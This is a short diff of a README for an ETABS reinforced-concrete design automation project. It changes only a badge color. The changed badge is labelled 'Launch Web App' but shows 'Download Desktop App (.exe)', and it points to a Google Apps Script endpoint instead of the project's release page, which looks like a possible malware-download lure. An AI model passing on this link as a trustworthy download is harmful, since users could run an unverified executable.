@@ -2,7 +2,7 @@
 
 ETABS automation: intelligent modeling, optimization, and design verification of reinforced-concrete buildings.
 
-[![Launch Web App](https://img.shields.io/badge/Download-Desktop%20App%20(.exe)-555?style=for-the-badge)](https://script.google.com/macros/s/AKfycbwP639tNpJjFcSv-pTBfLZEUVEqnLCp0Dq5cu-XExDmosBLkoetQaqKS4kLYwq9AhTD/exec)
+[![Launch Web App](https://img.shields.io/badge/Download-Desktop%20App%20(.exe)-0078D4?style=for-the-badge)](https://script.google.com/macros/s/AKfycbwP639tNpJjFcSv-pTBfLZEUVEqnLCp0Dq5cu-XExDmosBLkoetQaqKS4kLYwq9AhTD/exec)
 [![Download EXE](https://img.shields.io/badge/Download-Desktop%20App%20(.exe)-555?style=for-the-badge)](https://github.com/mrbkarimi/ETABS-Analysis-Automation/releases/latest)
 [![Documentation](https://img.shields.io/badge/Docs-Technical%20Report-059669?style=for-the-badge)](https://mrbkarimi.github.io/ETABS-Analysis-Automation/)
 
